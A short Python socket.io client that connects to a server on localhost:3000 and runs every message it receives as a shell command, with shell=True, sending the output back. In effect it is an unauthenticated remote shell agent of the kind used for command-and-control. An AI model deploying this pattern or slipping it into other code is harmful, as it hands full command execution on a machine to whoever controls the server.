import socketio
import subprocess
import os

sio = socketio.Client()

class Session:
    def __init__(self):
        self.current_directory = os.getcwd()

session = Session()

@sio.on('message')
def on_message(msg):
    global session

    if msg.lower() == 'exit':
        sio.disconnect()
        return

    if msg.startswith('cd '):
        try:
            os.chdir(msg[3:].strip())
            session.current_directory = os.getcwd()
        except Exception as e:
            sio.emit('message', f"Error changing directory: {str(e)}")
        else:
            sio.emit('message', f"Changed directory to: {session.current_directory}")
    else:
        output = execute_command(msg)
        sio.emit('message', output)

def execute_command(command):
    try:
        result = subprocess.run(command, shell=True, capture_output=True, text=True, cwd=session.current_directory)
        return result.stdout if result.returncode == 0 else f"Error: {result.stderr}"
    except Exception as e:
        return f"Error: {str(e)}"

sio.connect('http://localhost:3000')

try:
    while True:
        pass
except KeyboardInterrupt:
    sio.emit('message', 'exit')
    sio.disconnect()
